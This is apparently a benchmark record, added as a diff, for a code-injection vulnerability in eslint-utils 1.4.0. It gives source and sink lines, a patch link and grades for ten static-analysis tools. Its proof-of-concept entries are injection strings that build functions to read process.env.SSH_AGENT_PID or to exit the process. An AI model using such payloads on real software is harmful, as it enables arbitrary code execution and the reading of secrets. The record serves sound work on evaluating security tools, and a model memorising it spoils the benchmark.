@@ -1,0 +1,105 @@
+{
+    "advisory": {
+        "id": "GHSA-3gx7-xhv7-5mx3",
+        "npm_id": "1118",
+        "cve": "CVE-2019-15657",
+        "cwe": "CWE-94",
+        "github_link": "https://github.com/advisories/GHSA-3gx7-xhv7-5mx3"
+    },
+    "correct_cwe": "CWE-94",
+    "correct_package_link": "https://registry.npmjs.org/eslint-utils/-/eslint-utils-1.4.0.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 648,
+                    "code": "function getStaticValue(node, initialScope = null) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 416,
+                    "code": "                   return { value: receiver[methodName](...args) }"
+                }
+            },
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 648,
+                    "code": "function getStaticValue(node, initialScope = null) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 422,
+                    "code": "                   return { value: func(...args) }"
+                }
+            },
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 648,
+                    "code": "function getStaticValue(node, initialScope = null) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 509,
+                    "code": "            return { value: object.value[property.value] }"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "file_path": "1118_GHSA-3gx7-xhv7-5mx3.poc.js"
+        },
+        {
+            "code": "var codeToInject = 'Function(\"return process.env.SSH_AGENT_PID\")()'"
+        },
+        {
+            "code": "var codeToInject = 'new Function(\"return process.env.SSH_AGENT_PID\")()'"
+        },
+        {
+            "code": "var codeToInject = '({}.constructor.constructor(\"return process.env.SSH_AGENT_PID\")())'"
+        },
+        {
+            "code": "var codeToInject = 'Object.create(null, {a:{get:new {}.constructor.constructor(\"console.log(\\\"code injected\\\"); process.exit(1)\")}}).a'"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/mysticatea/eslint-utils/commit/08158db1c98fd71cf0f32ddefbc147e2620e724c"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "D"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "C"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
